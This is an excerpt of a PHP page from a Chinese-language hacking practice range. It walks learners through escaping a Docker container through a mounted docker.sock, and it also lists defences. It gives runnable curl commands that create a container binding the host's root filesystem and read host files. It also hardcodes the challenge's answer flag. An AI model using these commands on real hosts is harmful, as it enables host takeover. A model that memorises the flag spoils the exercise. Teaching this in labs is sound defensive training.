...
$CORRECT_FLAG = "flag{docker_sock_Mode_Host_Mount_Escape_Done}";
$flag_result = "";
$user_flag = "";
...
if (isset($_POST['start_sandbox'])) {
    shell_exec("/var/www/html/docker-cli rm -f pikachu-lab-sock-escape 2>&1");
    $out = shell_exec("/var/www/html/docker-cli run -d --name pikachu-lab-sock-escape -v /var/run/docker.sock:/var/run/docker.sock docker.m.daocloud.io/library/ubuntu:22.04 sleep infinity 2>&1");
    ...
    $sandbox_msg = "<div class='alert alert-success' style='border-radius:10px; font-weight:700;'><i class='fa fa-check'></i> 真实靶场容器 [pikachu-lab-sock-escape] 已部署并在后台运行！</div>";
}
if (isset($_POST['stop_sandbox'])) {
    shell_exec("/var/www/html/docker-cli rm -f pikachu-lab-sock-escape 2>&1");
    $sandbox_msg = "<div class='alert alert-warning' style='border-radius:10px; font-weight:700;'><i class='fa fa-stop'></i> 真实靶场容器 [pikachu-lab-sock-escape] 已强制销毁清理！</div>";
}
            ...
            <div class="cyber-stage-container">
                ...
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        ⚡ 2. Docker Socket 挂载逃逸 (docker.sock)
                ...
                <div class="cyber-header-card" style="border-left:4px solid #10b981; margin-bottom: 24px; display:flex; flex-direction:column; gap:16px;">
                    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
                        <div>
                            ...
                            <p style="margin:5px 0 0 0; color:var(--text-secondary); font-size:13px;">实战演练前，请先点击启动。系统将为您分配专属的隔离沙箱 <code>pikachu-lab-sock-escape</code>，用完后请销毁。</p>
                        </div>
...
docker exec pikachu-lab-sock-escape bash -c "echo 'flag{**********}' > /etc/docker_escape_flag.txt"</div>
                    </details>
                </div>
                    ...
                    <div class="col-md-5">
                        <div class="cyber-guide-section">
                            ...
                            <div class="cyber-callout-danger">
                                ...
                                <p>当将宿主机的 <code>/var/run/docker.sock</code> 文件挂载到容器内部时，容器内的进程可以通过该 Unix Domain Socket 直接与宿主机的 Docker Daemon 进行通信。这意味着容器拥有了操作整个 Docker 引擎的权限，可以随意创建、启动、销毁容器，甚至挂载宿主机的根目录，从而轻松实现逃逸并接管物理机。</p>
                            </div>

                            <div class="cyber-callout-success">
                                <h5 style="color:#10b981; margin-top:0; font-weight:700;"><i class="fa fa-shield"></i> 最佳防御与修复方案</h5>
                                <ol>
                                    <li>坚决禁止将 <code>docker.sock</code> 挂载到不受信任的容器内部。</li>
                                    <li>若必须通信，请考虑开启 Docker TLS TCP 监听，并使用严格的客户端证书双向认证机制。</li>
                                    <li>使用更安全的隔离方案或限制容器内用户的权限，避免容器内应用以 root 身份运行。</li>
                                </ol>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    ...
                                    <div class="cyber-step-title">探测 Docker Socket</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 查看容器内是否存在 <code>/var/run/docker.sock</code>，并验证其权限。
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">ls -la /var/run/docker.sock</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('ls -la /var/run/docker.sock')">填入终端</button>
                                </div>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    ...
                                    <div class="cyber-step-title">下载 Docker CLI 工具</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 在容器内下载一个 docker 静态二进制文件，方便后续通过 sock 与 Docker 引擎通信。（由于靶场无外网，我们直接使用原生指令模拟）
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">curl --unix-socket /var/run/docker.sock http://localhost/info</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('curl --unix-socket /var/run/docker.sock http://localhost/info')">填入终端</button>
                                </div>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    ...
                                    <div class="cyber-step-title">创建特权挂载容器</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 通过 Docker Daemon API 在宿主机上创建一个新容器，并将宿主机的 <code>/</code> 根目录挂载到新容器的 <code>/host_root</code> 目录下。
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/create?name=sock-escape-test -d '{"Image": "ubuntu:22.04", "Cmd": ["sleep", "infinity"], "HostConfig": {"Binds": ["/:/host_root"]}}'</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('curl -X POST -H \"Content-Type: application/json\" --unix-socket /var/run/docker.sock http://localhost/containers/create?name=sock-escape-test -d ''{\"Image\": \"ubuntu:22.04\", \"Cmd\": [\"sleep\", \"infinity\"], \"HostConfig\": {\"Binds\": [\"/:/host_root\"]}}''')">填入终端</button>
                                </div>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    ...
                                    <div class="cyber-step-title" style="color:#ef4444;">启动并获取 Flag</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 启动该恶意容器，并在其内部读取宿主机的 flag 文件。
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/sock-escape-test/start && curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/sock-escape-test/exec -d '{"AttachStdout": true, "AttachStderr": true, "Cmd": ["cat", "/host_root/etc/docker_escape_flag.txt"]}'</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/sock-escape-test/start && curl -X POST -H \"Content-Type: application/json\" --unix-socket /var/run/docker.sock http://localhost/containers/sock-escape-test/exec -d ''{\"AttachStdout\": true, \"AttachStderr\": true, \"Cmd\": [\"cat\", \"/host_root/etc/docker_escape_flag.txt\"]}''')">填入终端</button>
                                </div>
                            </div>
...
const CURRENT_CONTAINER_NAME = 'pikachu-lab-sock-escape';
